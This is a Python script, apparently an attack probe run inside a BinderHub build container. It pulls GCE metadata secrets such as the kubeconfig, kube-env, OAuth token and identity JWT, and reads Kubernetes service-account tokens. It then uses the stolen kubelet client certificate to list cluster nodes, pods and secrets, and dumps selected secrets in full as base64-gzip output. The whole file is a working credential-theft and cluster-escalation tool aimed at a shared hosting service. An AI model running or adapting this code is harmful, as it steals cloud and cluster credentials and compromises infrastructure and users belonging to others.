#!/usr/bin/env python3
"""BinderHub build-pod probe: metadata attributes + KSA token + kubelet-cert API access.

Runs inside the repo2docker build container (namespace bhs). Two modes:
  meta : dump GCE metadata attributes (kubeconfig, kube-env, configure-sh, user-data), identity JWT,
         KSA token file attempts and docker socket checks.
  api  : parse the kubeconfig attribute, write the kubelet client cert/key, query the in-cluster
         kube-apiserver read-only (nodes, pods, secrets, SelfSubjectRulesReview) and dump findings.
"""
import base64
import gzip
import json
import os
import re
import ssl
import sys
import urllib.request
import urllib.error

MD = "http://169.254.169.254/computeMetadata/v1/"
HDR = {"Metadata-Flavor": "Google"}
CHUNK = 2800
MAX_SECRET_LOG = 340000
_logged = 0


def out(s=""):
    global _logged
    s = str(s)
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    _logged += len(s) + 1


def chunked_p(label, data, width=CHUNK):
    out("--%s--%d--" % (label, len(data)))
    for i in range(0, len(data), width):
        out(data[i:i + width])
    out("--%s-end--" % label)


def md_get(path, timeout=10):
    req = urllib.request.Request(MD + path, headers=HDR)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, repr(e).encode()


def meta():
    out("===META2-BEGIN===")
    for p in ["project/project-id", "project/numeric-project-id", "instance/name", "instance/zone",
              "instance/id", "instance/service-accounts/default/email"]:
        st, b = md_get(p)
        out("-- %s [status:%s]\n%s" % (p, st, b.decode("utf8", "replace")))
    for p, lbl in [("instance/attributes/kubeconfig", "KUBECONFIG"),
                   ("instance/attributes/kube-env", "KUBEENV"),
                   ("instance/attributes/kubelet-config", "KUBELETCONFIG"),
                   ("instance/attributes/kube-labels", "KUBELABELS")]:
        st, b = md_get(p)
        chunked_p("%s status=%s b64" % (lbl, st), base64.b64encode(b).decode())
    for p, lbl in [("instance/attributes/configure-sh", "CONFIGURESH"),
                   ("instance/attributes/user-data", "USERDATA")]:
        st, b = md_get(p)
        chunked_p("%s status=%s raw" % (lbl, st), b.decode("utf8", "replace"))
    # remaining attribute values (short ones)
    for a in ["cluster-location", "cluster-name", "cluster-uid", "created-by", "instance-template",
              "google-compute-enable-pcid", "serial-port-logging-enable", "disable-legacy-endpoints",
              "gci-metrics-enabled", "gci-update-strategy"]:
        st, b = md_get("instance/attributes/" + a)
        out("--ATTR %s [status:%s]\n%s" % (a, st, b.decode("utf8", "replace")[:500]))
    # identity JWT (GCE OIDC)
    st, b = md_get("instance/service-accounts/default/identity?audience=binderhub-probe&format=full")
    out("--IDENTITY [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    st, b = md_get("instance/service-accounts/default/token")
    out("--TOKEN [status:%s]\n%s" % (st, b.decode("utf8", "replace")))
    # KSA token attempts
    out("--SA-DIR--")
    for d in ["/var/run/secrets/kubernetes.io/serviceaccount", "/var/run/secrets"]:
        try:
            out("%s: %s" % (d, os.listdir(d)))
        except Exception as e:
            out("%s: ERR %r" % (d, e))
    for f in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
              "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
              "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"]:
        try:
            with open(f, "rb") as fh:
                b = fh.read()
            chunked_p("FILE %s len=%d" % (f, len(b)), b.decode("utf8", "replace"))
        except Exception as e:
            out("FILE %s: ERR %r" % (f, e))
    out("--SOCKETS--")
    for s in ["/var/run/docker.sock", "/run/docker.sock", "/var/run/bhs-bhs/docker-api/docker-api.sock",
              "/var/run/docker-api/docker-api.sock", "/var/run/docker.pid"]:
        out("%s: %s" % (s, os.path.exists(s)))
    out("--ENV--")
    for k, v in sorted(os.environ.items()):
        if re.search(r"KUBE|SA|GOOGLE|GCP|PROJECT|CLUSTER|BINDER|JUPYTER|DOCKER", k, re.I):
            out("%s=%s" % (k, v[:300]))
    out("===META2-END===")


def kubeconfig_creds():
    st, b = md_get("instance/attributes/kubeconfig", timeout=15)
    k = b.decode("utf8", "replace")
    if st != 200 or "server:" not in k:
        raise SystemExit("kubeconfig unavailable status=%s head=%r" % (st, k[:200]))

    def grab(key):
        m = re.search(r"^\s*" + key + r":\s*(\S+)\s*$", k, re.M)
        return base64.b64decode(m.group(1)) if m else None

    ca, crt, key = grab("certificate-authority-data"), grab("client-certificate-data"), grab("client-key-data")
    srv = re.search(r"^\s*server:\s*(\S+)", k, re.M).group(1)
    open("/tmp/ca.crt", "wb").write(ca)
    open("/tmp/client.crt", "wb").write(crt)
    open("/tmp/client.key", "wb").write(key)
    return srv


def api():
    out("===API-BEGIN===")
    try:
        srv = kubeconfig_creds()
    except SystemExit as e:
        out("NO-KUBECONFIG %s" % e)
        return
    out("SERVER %s" % srv)
    ctx = ssl.create_default_context(cafile="/tmp/ca.crt")
    ctx.load_cert_chain("/tmp/client.crt", "/tmp/client.key")

    def call(path, method="GET", body=None, timeout=15):
        req = urllib.request.Request(srv + path, method=method, data=body,
                                     headers={"Content-Type": "application/json", "Accept": "application/json"})
        try:
            r = urllib.request.urlopen(req, context=ctx, timeout=timeout)
            return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return -1, repr(e).encode()

    st, b = call("/api/v1/nodes")
    out("NODES status=%s len=%d" % (st, len(b)))
    if st == 200:
        for n in json.loads(b).get("items", []):
            md = n.get("metadata", {})
            stat = n.get("status", {})
            addrs = [(a.get("type"), a.get("address")) for a in stat.get("addresses", [])]
            cap = stat.get("capacity", {})
            out("NODE %s addrs=%s cpu=%s mem=%s gpu=%s labels=%s" % (
                md.get("name"), addrs, cap.get("cpu"), cap.get("memory"),
                cap.get("nvidia.com/gpu"), json.dumps(md.get("labels", {}))[:600]))
    else:
        out(b[:400].decode("utf8", "replace"))

    st, b = call("/api/v1/pods?limit=500")
    out("PODS status=%s len=%d" % (st, len(b)))
    if st == 200:
        for p in json.loads(b).get("items", []):
            md = p.get("metadata", {})
            spec = p.get("spec", {})
            secvols = []
            for v in spec.get("volumes", []) or []:
                if v.get("secret"):
                    secvols.append(v["secret"].get("secretName"))
                if v.get("projected"):
                    for src in v["projected"].get("sources", []):
                        if src.get("secret"):
                            secvols.append(src["secret"].get("name"))
            ctrs = [(c.get("name"), c.get("image")) for c in spec.get("containers", []) or []]
            out("POD %s|%s|node=%s|sa=%s|phase=%s|secvols=%s|ctrs=%s" % (
                md.get("namespace"), md.get("name"), spec.get("nodeName"),
                spec.get("serviceAccountName"), p.get("status", {}).get("phase"),
                secvols, ctrs))
    else:
        out(b[:400].decode("utf8", "replace"))

    st, b = call("/api/v1/secrets?limit=500")
    out("SECRETS status=%s len=%d" % (st, len(b)))
    interesting = []
    if st == 200:
        d = json.loads(b)
        out("SECRET-COUNT %d" % len(d.get("items", [])))
        for s in d.get("items", []):
            md = s.get("metadata", {})
            name = md.get("name", "")
            out("SEC %s|%s|%s|keys=%s" % (md.get("namespace"), name, s.get("type"),
                                          sorted((s.get("data") or {}).keys())))
            if re.search(r"docker|registr|gcp|google|cloud|sa-|service-account|token|tls|secret|hub|key|config|proxy",
                         name, re.I):
                interesting.append(s)
    else:
        out(b[:400].decode("utf8", "replace"))

    for s in interesting:
        if _logged > MAX_SECRET_LOG:
            out("SECRET-LOG-CAP-REACHED")
            break
        md = s.get("metadata", {})
        out("===SECRET-FULL %s/%s type=%s" % (md.get("namespace"), md.get("name"), s.get("type")))
        raw = json.dumps(s).encode()
        out("--b64gzip len=%d--" % len(raw))
        out(base64.b64encode(gzip.compress(raw)).decode())
        out("--end--")

    body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                       "spec": {"namespace": "bhs"}}).encode()
    for ns in ["bhs", "bindernew", "jupyter", ""]:
        body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                           "spec": {"namespace": ns}}).encode()
        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body)
        out("SSRR ns=%r status=%s\n%s" % (ns, st, b[:4000].decode("utf8", "replace")))

    for path in ["/api/v1/namespaces", "/apis/apps/v1/deployments?limit=200",
                 "/apis/rbac.authorization.k8s.io/v1/clusterroles?limit=5"]:
        st, b = call(path)
        out("MISC %s status=%s len=%d %s" % (path, st, len(b), b[:300].decode("utf8", "replace")))
    out("===API-END===")


if __name__ == "__main__":
    {"meta": meta, "api": api}[sys.argv[1]]()
